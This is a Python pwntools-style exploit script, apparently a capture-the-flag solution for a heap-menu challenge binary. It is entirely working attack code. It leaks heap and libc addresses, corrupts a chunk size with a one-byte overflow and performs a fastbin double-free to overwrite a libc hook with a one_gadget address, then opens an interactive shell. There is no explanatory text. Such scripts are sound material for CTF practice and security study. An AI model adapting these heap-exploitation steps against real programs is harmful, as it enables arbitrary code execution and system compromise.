#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"Input: ")
    sl(i2b(choice))


def add(length, data1, data2):
    cmd(1)
    ru(b"Select length: ")
    sl(i2b(length))
    ru(b"Enter credentials: ")
    s(data1)
    ru(b"Name of the credentials: ")
    s(data2)


def delet(idx):
    cmd(3)
    ru(b"Select index: ")
    sl(i2b(idx))


add(0x48, b"a", b"b")
add(0x48, b"c", b"d")
add(0x48, b"c", b"d")
add(0x48, b"c", b"d")
add(0x48, b"c", b"d")
delet(0)
delet(2)
delet(3)
add(0x48, b"a", b"b")
cmd(2)
ru(b"--> ")
heap_base = u64_ex(ru(b"1.", drop=True)) - 0x61
lg("heap_base", heap_base)

add(0x48, b"a", b"b")
add(0x48, b"a" * 0x40 + p64(0x50) + p8(0xF1), b"b")
delet(1)

add(0x48, b"a", b"b")
cmd(2)
ru(b"1. b --> ")
libc_base = u64_ex(ru(b"2. b --> ", drop=True)) - 0x3B4C61
lg("libc_base", libc_base)

delet(1)
delet(3)
add(0x68, b"a", b"b")
add(0x68, b"a", b"b")
delet(1)
delet(3)
delet(2)
add(0x68, p64(libc_base + 0x3B4B2D), b"c")
add(0x68, b"a", b"b")
add(0x68, b"a", b"b")

og = [0xC4DBF, 0xC4DDF, 0xC4DE6, 0xE1FA1]
x = libc_base + og[3]
add(0x68, b"\x00" * 0x13 + p64(x), b"b")
lg("x", x)
cmd(1)
ru(b"Select length: ")
sl(b"64")

ia()
